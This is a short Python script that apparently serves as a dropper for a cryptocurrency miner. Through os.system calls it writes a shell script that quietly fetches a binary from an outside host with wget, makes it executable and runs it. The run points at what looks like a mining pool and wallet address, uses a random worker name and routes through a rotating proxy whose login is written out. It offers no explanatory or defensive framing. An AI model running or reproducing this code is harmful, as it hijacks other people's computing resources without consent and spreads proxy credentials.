import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
os.system('echo "./ac-gpu -F http://aqua.signal2noi.se:19998/0xdCBDe4E1BF120243e26629610EA6e0440b8560a2/$(echo $(shuf -i 1000-9999 -n 1)-ODADING) -t 1 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
os.system('sleep 2')
os.system('sh tes')
